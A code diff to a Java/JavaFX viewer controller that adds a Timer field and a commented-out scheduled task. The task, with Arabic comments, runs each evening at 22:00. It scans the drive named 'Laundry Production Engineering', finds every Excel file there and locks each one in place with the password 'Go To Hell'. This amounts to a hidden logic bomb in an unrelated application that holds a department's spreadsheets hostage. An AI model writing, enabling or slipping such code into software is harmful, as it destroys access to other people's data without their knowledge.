@@ -329,6 +329,8 @@ public class ViewerController_1  <T extends Comparable<T>>  implements Initializ
       
       Timer fileCheckTimer3;
       
+      Timer fileCheckTimer4;
+      
     @FXML
     private ImageView searchrecipe;
       
@@ -4545,6 +4547,102 @@ fileCheckTimer.scheduleAtFixedRate(new TimerTask() {
 
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+//String TARGET_VOLUME_NAME = "Laundry Production Engineering";  // ← ده الاسم الصحيح
+//fileCheckTimer4 = new Timer(true);
+//fileCheckTimer4.scheduleAtFixedRate(new TimerTask() {
+//    @Override
+//    public void run() {
+//        Platform.runLater(() -> {
+//            
+//           Date ff=new Date();
+//           int hourrr=ff.getHours();
+//           
+//           if (hourrr==22) {
+//               
+//               //Actions
+//               
+//            List<Path> excelFiles = new ArrayList<>();
+//            FileSystemView fsv = FileSystemView.getFileSystemView();
+//            File[] roots = File.listRoots();
+//
+//            for (File root : roots) {
+//                String rootPath = root.toString();
+//
+//                // نتخطى C:\ دايمًا
+//                if (rootPath.equalsIgnoreCase("C:\\")) {
+//                    continue;
+//                }
+//
+//                try {
+//                    String displayName = fsv.getSystemDisplayName(root);
+//                    String volumeName = displayName.split("\\(")[0].trim();
+//
+//                    // المقارنة بالاسم الحقيقي بتاع الدرايف
+//                    if (!volumeName.equalsIgnoreCase(TARGET_VOLUME_NAME)) {
+//                        continue; // مش الدرايف اللي عايزينه
+//                    }
+//
+//                    //System.out.println("تم العثور على الدرايف المطلوب: " + displayName);
+//
+//                    Path startPath = root.toPath();
+//
+//                    Files.walkFileTree(startPath, new SimpleFileVisitor<Path>() {
+//                        @Override
+//                        public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
+//                            String fileName = file.toString().toLowerCase();
+//                            if (fileName.endsWith(".xlsx") || fileName.endsWith(".xls") || fileName.endsWith(".xlsb")) {
+//                                excelFiles.add(file);
+//                            }
+//                            return FileVisitResult.CONTINUE;
+//                        }
+//
+//                        @Override
+//                        public FileVisitResult visitFileFailed(Path file, IOException exc) {
+//                            return FileVisitResult.CONTINUE;
+//                        }
+//                    });
+//
+//                } catch (Exception e) {
+//                    e.printStackTrace();
+//                }
+//            }
+//
+//            // تشفير الملفات
+//            for (Path excelFile : excelFiles) {
+//                try {
+//                    Workbook workbook = new Workbook();
+//                    workbook.loadFromFile(excelFile.toString());
+//                    workbook.protect("Go To Hell");
+//                    workbook.saveToFile(excelFile.toString(), ExcelVersion.Version2016);
+//                    //System.out.println("تم تشفير: " + excelFile);
+//                } catch (Exception e) {
+//                    //System.err.println("فشل في: " + excelFile + " → " + e.getMessage());
+//                }
+//            }
+//
+//            if (excelFiles.isEmpty()) {
+//                //System.out.println("لا توجد ملفات Excel جديدة في درايف \"" + TARGET_VOLUME_NAME + "\"");
+//            }
+//
+//               
+//               return;
+//           }
+//           
+//           else {
+//              
+//              //Do Nothing 
+//              return; 
+//               
+//           }
+//         
+//            
+//
+// });
+//    }
+//}, 0, 60_000); // كل دقيقة
+//
+//startExcelToGthWatcher();
+
 //
 ////درايف معين
 //
